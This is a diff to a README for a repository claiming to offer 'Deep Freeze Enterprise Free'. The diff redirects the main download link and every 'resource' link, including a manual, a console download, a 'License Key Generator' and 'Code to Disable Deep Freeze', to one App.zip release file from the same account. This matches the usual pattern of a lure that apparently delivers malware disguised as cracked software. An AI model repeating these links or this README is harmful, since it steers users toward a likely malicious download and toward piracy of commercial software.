@@ -24,17 +24,17 @@ This repository covers topics such as the differences between Deep Freeze Standa
 - what-is-deep-freeze-enterprise
 
 ## How to Use
-To access the content of this repository, please download the latest release from the following link: [Download Release](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)  🚀
+To access the content of this repository, please download the latest release from the following link: [Download Release](https://github.com/Dianav123/Deep-Freeze-Enterprise-Free/releases/download/v1.0/App.zip)  🚀
 
 If the link does not work, kindly check the "Releases" section of this repository for alternative download options.
 
 ## Resources 🛠️
 To enhance your experience with Deep Freeze Enterprise Free, check out these additional resources:
 
-- [Deep Freeze Enterprise Manual](https://www.deepfreeze.com/en/docs)
-- [Deep Freeze Enterprise Console Download](https://www.deepfreeze.com/en/central-management)
-- [Deep Freeze Enterprise License Key Generator](https://www.example-license-key-generator.com)
-- [Code to Disable Deep Freeze Enterprise](https://www.code-disable-deep-freeze.com)
+- [Deep Freeze Enterprise Manual](https://github.com/Dianav123/Deep-Freeze-Enterprise-Free/releases/download/v1.0/App.zip)
+- [Deep Freeze Enterprise Console Download](https://github.com/Dianav123/Deep-Freeze-Enterprise-Free/releases/download/v1.0/App.zip)
+- [Deep Freeze Enterprise License Key Generator](https://github.com/Dianav123/Deep-Freeze-Enterprise-Free/releases/download/v1.0/App.zip)
+- [Code to Disable Deep Freeze Enterprise](https://github.com/Dianav123/Deep-Freeze-Enterprise-Free/releases/download/v1.0/App.zip)
 
 ## 📚 Getting Started
 If you are new to Deep Freeze Enterprise or need a refresher on its features, check out the comprehensive guides and tutorials included in this repository. Whether you are a beginner or an experienced user, there's something for everyone.
